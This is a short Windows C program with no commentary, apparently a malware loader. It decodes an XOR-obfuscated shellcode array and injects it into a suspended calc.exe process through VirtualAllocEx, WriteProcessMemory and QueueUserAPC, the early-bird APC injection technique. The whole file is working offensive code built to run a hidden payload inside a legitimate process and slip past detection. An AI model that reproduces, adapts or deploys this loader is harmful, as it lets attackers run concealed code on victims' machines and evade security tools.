#include <windows.h>
#include <stdio.h>
unsigned char shellcode[] = {
46, 87, 175, 46, 231, 143, 160, 153, 153, 153, 46, 235, 99, 137, 153, 153, 153, 46, 221, 136, 201, 16, 247, 13, 255, 93, 233, 46, 87, 62, 65, 46, 75, 158, 153, 153, 153, 132, 146, 116, 129, 147, 19, 253, 23, 157, 233, 136, 201, 81, 166, 76, 175, 15, 184, 222, 129, 33, 37, 104, 183, 214, 187, 232, 129, 155, 165, 21, 183, 214, 187, 168, 129, 155, 133, 93, 183, 82, 94, 194, 131, 93, 198, 196, 183, 108, 41, 36, 245, 113, 139, 15, 211, 125, 168, 73, 0, 29, 182, 12, 62, 191, 4, 218, 136, 65, 191, 134, 173, 125, 98, 202, 245, 88, 246, 221, 116, 221, 97, 136, 201, 16, 191, 136, 63, 41, 142, 192, 200, 192, 167, 134, 183, 69, 173, 3, 137, 48, 190, 12, 47, 190, 191, 192, 54, 217, 182, 134, 203, 213, 161, 137, 31, 93, 198, 196, 183, 108, 41, 36, 136, 209, 62, 0, 190, 92, 40, 176, 41, 101, 6, 65, 252, 17, 205, 128, 140, 41, 38, 120, 39, 5, 173, 3, 137, 52, 190, 12, 47, 59, 168, 3, 197, 88, 179, 134, 191, 65, 160, 137, 25, 81, 124, 9, 119, 21, 232, 88, 136, 72, 182, 85, 161, 4, 179, 201, 145, 81, 174, 76, 165, 21, 106, 100, 233, 81, 165, 242, 31, 5, 168, 209, 147, 88, 124, 31, 22, 10, 22, 119, 54, 77, 190, 179, 136, 46, 219, 215, 250, 34, 247, 13, 190, 11, 160, 1, 47, 88, 118, 225, 95, 92, 233, 136, 128, 153, 18, 68, 67, 95, 233, 137, 114, 208, 95, 77, 125, 28, 189, 193, 64, 244, 187, 132, 14, 28, 83, 196, 190, 54, 240, 242, 42, 17, 96, 98, 161, 17, 246, 13, 255, 4, 168, 50, 224, 144, 156, 13, 0, 136, 185, 216, 132, 33, 62, 64, 206, 157, 161, 119, 9, 88, 126, 207, 183, 162, 41, 192, 64, 209, 182, 183, 21, 82, 54, 104, 54, 197, 191, 132, 56, 55, 249, 201, 145, 92, 126, 239, 183, 212, 16, 201, 115, 137, 82, 121, 158, 162, 60, 192, 72, 212, 183, 15, 255, 93, 160, 48, 170, 125, 147, 13, 255, 93, 233, 136, 136, 64, 182, 93, 183, 212, 11, 223, 158, 71, 186, 60, 63, 55, 228, 209, 136, 64, 21, 241, 153, 154, 173, 172, 157, 17, 246, 69, 114, 25, 205, 144, 15, 16, 159, 69, 118, 187, 191, 216, 136, 64, 182, 93, 190, 13, 160, 119, 9, 81, 167, 68, 0, 149, 164, 1, 8, 92, 126, 204, 190, 231, 144, 68, 246, 150, 8, 216, 183, 108, 59, 192, 54, 218, 124, 3, 190, 231, 225, 15, 212, 112, 8, 216, 68, 173, 92, 42, 159, 81, 77, 171, 106, 224, 116, 119, 28, 88, 116, 201, 215, 97, 239, 244, 195, 144, 12, 237, 138, 88, 82, 207, 218, 98, 152, 103, 255, 4, 168, 1, 19, 239, 34, 13, 255, 93, 233
};
int sc_len = sizeof(shellcode);

STARTUPINFO si;
PROCESS_INFORMATION pi;

int main()
{
	for (int i = 0; i < sc_len; i++)shellcode[i] = shellcode[i] ^ 0x66;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	memset(&pi, 0, sizeof(pi));
	CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL,NULL,(LPSTARTUPINFOA) &si, (LPPROCESS_INFORMATION)&pi);
	LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, addr, shellcode, sc_len, NULL);
	PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)addr;
	QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL);
	ResumeThread(pi.hThread);
	return 0;
}